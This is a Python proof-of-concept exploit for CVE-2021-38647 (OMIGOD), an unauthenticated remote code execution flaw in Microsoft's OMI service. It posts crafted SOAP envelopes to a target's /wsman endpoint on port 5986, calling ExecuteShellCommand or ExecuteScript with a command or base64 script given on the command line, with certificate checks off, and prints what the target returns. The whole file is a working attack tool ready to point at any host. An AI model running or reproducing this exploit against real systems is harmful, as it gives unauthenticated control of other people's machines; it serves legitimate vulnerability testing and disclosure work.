  
#!/usr/bin/env python
# 
# Author: Chirag Savla (@chiragsavla94) of Altered Security Pte Ltd.
# 
# Credit: WIZ Team (@wiz_io)
#
# Blog: https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure


import requests
import xml.etree.ElementTree as ET
import warnings
import argparse
import html

warnings.filterwarnings("ignore")

Body = """
				<s:Envelope
	xmlns:s="http://www.w3.org/2003/05/soap-envelope"
	xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
	xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
	xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema"
	xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
	xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" >
	<s:Header>
		<a:To>HTTP://127.0.0.1:5986/wsman/</a:To>
		<w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
		<a:MessageID>uuid:6B72D22C-CC07-0005-0000-000000010000</a:MessageID>
		<w:OperationTimeout>PT1M30S</w:OperationTimeout>
		<w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
		<p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
		<w:OptionSet s:mustUnderstand="true"></w:OptionSet>
		<w:SelectorSet>
			<w:Selector Name="__cimnamespace">root/scx</w:Selector>
		</w:SelectorSet>
	</s:Header>
	<s:Body>
		<p:ExecuteShellCommand_INPUT
			xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
			<p:command>{cmd}</p:command>
			<p:timeout>0</p:timeout>
		</p:ExecuteShellCommand_INPUT>
	</s:Body>
</s:Envelope>
"""

ScriptBody = """
    <s:Envelope
	xmlns:s="http://www.w3.org/2003/05/soap-envelope"
	xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
	xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
	xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema"
	xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
	xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" >
	<s:Header>
		<a:To>HTTP://127.0.0.1:5986/wsman/</a:To>
		<w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
		<a:MessageID>uuid:DFAB024A-CC2A-0005-0000-000000010000</a:MessageID>
		<w:OperationTimeout>PT1M30S</w:OperationTimeout>
		<w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
		<p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
		<w:OptionSet s:mustUnderstand="true"></w:OptionSet>
		<w:SelectorSet>
			<w:Selector Name="__cimnamespace">root/scx</w:Selector>
		</w:SelectorSet>
	</s:Header>
	<s:Body>
		<p:ExecuteScript_INPUT
			xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
			<p:Script>{script}</p:Script>
			<p:Arguments></p:Arguments>
			<p:timeout>0</p:timeout>
			<p:b64encoded>true</p:b64encoded>
		</p:ExecuteScript_INPUT>
	</s:Body>
</s:Envelope>
"""

def exploit(TargetIP,TargetPort,Command,Script):
				url = "https://"+TargetIP+":"+TargetPort+"/wsman"
				headers = {'Content-Type': 'application/soap+xml;charset=UTF-8'}
				response = None
				if(Command):
								response = requests.post(url, headers=headers, data = Body.format(cmd=Command), verify=False)
				elif(Script):
								response = requests.post(url, headers=headers, data = ScriptBody.format(script=Script), verify=False)
				else:
								print("Please pass -c or -s argument.")

				if(response !=None):
								tree = ET.ElementTree(ET.fromstring(response.content))
								root = tree.getroot()
								if(root[1][0][1].text == "0"):
												print(root[1][0][2].text)
								else:
												print(root[1][0][3].text)

def main():
				parser = argparse.ArgumentParser(add_help = True, description = "CVE-2021-38647 - POC to exploit unauthenticated RCE #OMIGOD")
				parser.add_argument('-t', '--TargetIP', default='', help='Enter IP Address of the target machine.', required=True)
				parser.add_argument('-p', '--TargetPort', default='5986', help='Enter Target Port number on which the OMI service is running.', required=False)
				parser.add_argument('-c', '--Command', default='', help='Enter the command that needs to be executed on the target machine.', required=False)
				parser.add_argument('-s', '--Script', default='', help='Enter the command that needs to be executed on the target machine.', required=False)
				options = parser.parse_args()
				exploit(TargetIP=options.TargetIP, TargetPort=options.TargetPort, Command = html.escape(options.Command), Script = options.Script )


if __name__ == '__main__':
    main()

